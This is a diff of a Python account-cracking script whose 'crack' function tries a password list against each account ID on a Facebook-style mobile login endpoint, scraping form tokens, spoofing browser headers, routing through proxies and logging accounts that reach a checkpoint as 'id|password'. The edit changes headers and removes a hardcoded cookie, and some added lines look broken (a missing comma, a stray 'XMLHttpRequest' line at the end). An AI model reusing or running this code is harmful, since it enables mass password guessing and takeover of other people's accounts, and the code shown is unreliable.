@@ -621,24 +621,7 @@ def crack(idf,pwx,url,awal):
 	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
-			hd1 = {
-				"Host":url,
-				"sec-ch-ua": "\"Chromium\";v\u003d\"107\", \"Not\u003dA?Brand\";v\u003d\"24\"",
-				"sec-ch-ua-mobile": "?1",
-				"sec-ch-ua-platform": "\"Android\"",
-				"upgrade-insecure-requests":"1",
-				"user-agent":ua,
-				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
-				"sec-fetch-site":"none",
-				"sec-fetch-mode":"cors",
-				"sec-fetch-user":"empty",
-				"sec-fetch-dest":"document",
-				"referer":f"https://{url}/",
-				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
-				"cookie": "fr\u003d0xbJ42mzpRN9A6J7D.AWWQUUy5vfadzM7WIihxz8pw81s.BjZ71k.Qa.AAA.0.0.BjbM44.AWWvzoOHjSU"
-				}
-			link = ses.get(f'https://{url}/login/?source=auth_switcher', headers=hd1)
+			link = ses.get(f'https://{url}/login/?source=auth_switcher')
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
@@ -647,18 +630,17 @@ def crack(idf,pwx,url,awal):
 				"content-type":"application/x-www-form-urlencoded",
 				"user-agent":ua,
 				"accept":"*/*",
-				"x-requested-with":"com.facebook.katana",
-				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
+				"sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
 				"sec-ch-ua-mobile": "?0",
-				"sec-fetch-site":"same-origin",
+				"sec-fetch-site":"none",
 				"sec-fetch-mode":"cors",
-				"sec-fetch-user":"empty",
 				"sec-fetch-dest":"empty",
 				"referer":f"https://{url}/login/?source=auth_switcher",
 				"accept-encoding":"gzip, deflate br",
 				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+                                "x-requested-with":"XMLHttpRequest",
 				}
-			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=date, headers=hd2, proxies=proxy)
+			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
@@ -822,3 +804,4 @@ def make():
 	
 if __name__=='__main__':
 	make()	
+XMLHttpRequest
